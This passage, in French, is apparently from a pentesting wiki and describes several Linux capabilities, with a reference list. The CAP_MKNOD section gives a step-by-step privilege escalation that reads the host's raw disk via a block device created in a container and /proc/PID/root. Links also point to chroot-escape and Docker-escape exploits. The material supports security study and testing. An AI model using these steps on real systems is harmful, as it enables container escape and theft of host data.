
## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet l’exécution de l’appel système `chroot(2)`, ce qui peut potentiellement permettre de s’échapper des environnements `chroot(2)` au moyen de vulnérabilités connues.<sup>[[11]](#references)[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet l’exécution de l’appel système `reboot(2)` pour redémarrer le système, notamment avec des commandes telles que `LINUX_REBOOT_CMD_RESTART2` ; elle active également `kexec_load(2)` et, depuis Linux 3.17, `kexec_file_load(2)` pour charger respectivement de nouveaux crash kernels ou des crash kernels signés.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) a été séparée de **CAP_SYS_ADMIN** plus large dans Linux 2.6.37, accordant spécifiquement la possibilité d’utiliser l’appel `syslog(2)`. Cette capability permet d’afficher les adresses du kernel via `/proc` et des interfaces similaires lorsque le paramètre `kptr_restrict` vaut 1, ce qui contrôle l’exposition des adresses du kernel. Depuis Linux 2.6.39, la valeur par défaut de `kptr_restrict` est 0, ce qui signifie que les adresses du kernel sont exposées, bien que de nombreuses distributions la définissent à 1 (masquer les adresses sauf pour l’uid 0) ou à 2 (toujours masquer les adresses) pour des raisons de sécurité.<sup>[[14]](#references)</sup>

De plus, **CAP_SYSLOG** permet d’accéder à la sortie de `dmesg` lorsque `dmesg_restrict` vaut 1. Malgré ces changements, **CAP_SYS_ADMIN** conserve la possibilité d’effectuer des opérations `syslog` en raison de précédents historiques.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) étend les fonctionnalités de l’appel système `mknod` au-delà de la création de fichiers ordinaires, de FIFO (named pipes) ou de sockets de domaine UNIX. Elle permet spécifiquement de créer des fichiers spéciaux, notamment :<sup>[[14]](#references)</sup>

- **S_IFCHR** : fichiers spéciaux de type caractère, qui sont des périphériques tels que les terminaux.
- **S_IFBLK** : fichiers spéciaux de type bloc, qui sont des périphériques tels que les disques.

Cette capability est utile pour les processus qui doivent créer des fichiers de périphériques, notamment des périphériques caractère ou bloc.<sup>[[14]](#references)</sup>

Elle est incluse dans l’ensemble de capabilities par défaut documenté de Docker ; vérifiez la configuration réelle du runtime au lieu de supposer que chaque déploiement utilise les mêmes valeurs par défaut ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Cette capability permet d’effectuer des privilege escalations (par la lecture complète du disque) sur l’hôte, dans les conditions suivantes :<sup>[[7]](#references)</sup>

1. Disposer d’un accès initial à l’hôte (Unprivileged).
2. Disposer d’un accès initial au container (Privileged (EUID 0), et `CAP_MKNOD` effective).
3. L’hôte et le container doivent partager le même user namespace.

**Étapes pour créer et accéder à un périphérique bloc dans un container :**

1. **Sur l’hôte en tant qu’utilisateur standard :**

- Déterminez votre ID utilisateur actuel avec `id`, par exemple `uid=1000(standarduser)`.
- Identifiez le périphérique cible, par exemple `/dev/sdb`.

2. **Dans le container en tant que `root` :**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **De retour sur l’hôte :**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Cette approche permet à l'utilisateur standard d'accéder aux données de `/dev/sdb` via le container et potentiellement de les lire lorsque le device, les namespaces et les permissions sont configurés comme décrit.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Sur les kernels Linux actuels avec les file capabilities, **`CAP_SETPCAP`** permet à un thread d'ajouter des capabilities depuis son bounding set à son inheritable set, de supprimer des capabilities de son bounding set et de modifier ses securebits. Elle ne permet pas à un processus d'accorder arbitrairement des capabilities à un autre processus ; ce comportement s'applique uniquement aux kernels antérieurs à la version 2.6.25 qui ne prennent pas en charge les file capabilities.<sup>[[14]](#references)</sup>

L'appel système `capset()` peut ajuster les ensembles effective, permitted et inheritable d'un thread, mais le nouvel ensemble permitted ne peut pas contenir de capabilities absentes de l'ensemble permitted existant, et les mises à jour de l'ensemble inheritable restent soumises aux contraintes du kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - labs d'escalade de privilèges avec les Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - escalation de privilèges Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Bases des Linux Container : Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Exploiter les Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Capabilities excessives](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Abus de l'accès aux mount namespaces via /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities : pourquoi elles existent et comment elles fonctionnent](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Comprendre les Capabilities sous Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC pour contourner seccomp si ptrace est autorisé](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Comment s'échapper de différentes solutions chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - exploit original d'évasion Docker avec CAP_DAC_READ_SEARCH par Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analyse de l'exploit d'évasion Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - page du manuel Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - page du manuel Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - page du manuel Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - page du manuel Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - page du manuel Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Exécution de containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - page du manuel Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - page du manuel Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - page du manuel Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - page du manuel Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - page du manuel Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - page du manuel Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
